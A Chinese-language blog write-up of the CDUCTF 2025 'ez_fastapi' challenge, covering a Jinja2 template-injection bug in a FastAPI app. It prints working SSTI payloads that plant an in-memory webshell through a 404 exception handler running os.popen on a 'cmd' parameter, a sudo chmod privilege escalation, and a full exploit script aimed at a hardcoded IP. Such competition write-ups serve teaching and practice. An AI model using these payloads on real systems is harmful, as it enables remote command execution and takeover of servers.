+++
title= "CDUCTF 2025 Ezfastapi"
slug= "cductf2025-Ezfastapi"
description= ""
date= "2025-11-04T01:32:02+08:00"
lastmod= "2025-11-04T01:32:02+08:00"
image= ""
license= ""
categories= ["赛题"]
tags= ["ssti"]

+++

又是一年新生赛，这次我没怎么帮忙，但是我也看到大家做的不错，虽然我们只有三个方向的题目，但是质量在我预料之外的好了~😁

## 特别鸣谢

Xenny\NSSCTF、cdusec

## ez_fastapi

这次只提供了一道题，而且我看平台上面是出网的，不过也无所谓了，一血让来联系我也不来😑，那你霸王茶姬给我喝了😏

### WriteUp

查看文件，拿到源码

```php
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse
from fastapi.templating import Jinja2Templates
from jinja2 import Environment
import uvicorn

app = FastAPI()
templates = Jinja2Templates(directory="templates")

Jinja2 = Environment(variable_start_string='{', variable_end_string='}')

@app.exception_handler(404)
async def handler_404(request, exc):
    return JSONResponse(status_code=404, content={"message": "Not found"})

@app.get("/")
async def index(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})

@app.get("/shellMe")
async def shellMe(request: Request, username="Guest"):
    Jinja2.from_string("Welcome " + username).render()
    return templates.TemplateResponse("shellme.html", {"request": request})

def method_disabled(*args, **kwargs):
    raise NotImplementedError("此路不通！该方法已被管理员禁用。")

app.add_api_route = method_disabled
app.add_middleware = method_disabled

if __name__ == "__main__":
    
    uvicorn.run(app, host='0.0.0.0', port=8000)


```

很明显的SSTI漏洞，换了渲染符，所以可以使用`{}`，但是现在有问题，无回显，并且不出网，需要打内存马，然而禁用了

```python
app.add_api_route = method_disabled
app.add_middleware = method_disabled
```

也就是说这个动态添加路由的函数以及中间件注册内存马都不能使用了，但是可以使用异常处理器，其中的挖掘过程较为复杂，大概花费三四个小时。其中有一个小细节，由于给出的start.sh内容为

```sh
#!/bin/bash


exec uvicorn app:app --host 0.0.0.0 --port 8000
```

也就是说，应用并不是由`__main__`启动的，如果使用`__main__`的话是获取不到app对象的，所以需要修改成`app`才能获取

```bash
# 先添加恶意的异常处理器
{lipsum.__globals__['__builtins__']['eval']("sys.modules['app'].app.add_exception_handler(404,lambda request, exc:sys.modules['app'].app.__init__.__globals__['JSONResponse'](content={'message':__import__('os').popen(request.query_params.get('cmd') or 'whoami').read()}))")}

## 再重新构建 middleware_stack
{lipsum.__globals__['__builtins__']['exec']("app=sys.modules['app'].app;app.middleware_stack=app.build_middleware_stack()")}
```

成功注册内存马之后，尝试读取flag，权限不够，尝试提权，发现有chmod的sudo

```
sudo -l 
sudo chmod 6777 /flag
tac /flag
```

### exp

```python
import time
import requests
import re

url = "http://156.239.238.130:8000/"
def get_shell(url, payload):
    res = requests.get(f"{url}shellMe?username={payload}")
    return res.text

def get_flag(url,payload):
    res = requests.get(f"{url}test?cmd={payload}")
    if "flag{" in res.text:
        match = re.search(r'flag\{.*?\}', res.text)
        if match:
            flag = match.group(0)
            return flag

def exp():
    padyload1 = """{lipsum.__globals__['__builtins__']['eval']("sys.modules['app'].app.add_exception_handler(404,lambda request, exc:sys.modules['app'].app.__init__.__globals__['JSONResponse'](content={'message':__import__('os').popen(request.query_params.get('cmd') or 'whoami').read()}))")}"""
    get_shell(url, padyload1)
    time.sleep(1)
    payload2 = """{lipsum.__globals__['__builtins__']['exec']("app=sys.modules['app'].app;app.middleware_stack=app.build_middleware_stack()")}"""
    get_shell(url, payload2)
    time.sleep(1)
    payload3 = "sudo chmod 6777 /flag"
    get_flag(url, payload3)
    payload4 = "tac /flag"
    flag = get_flag(url, payload4)
    return flag

if __name__ == '__main__':
    flag=exp()
    print(flag)


```

## 小结

希望cdusec越来越好，感谢 **@G3rling** 师傅对学弟们的照顾

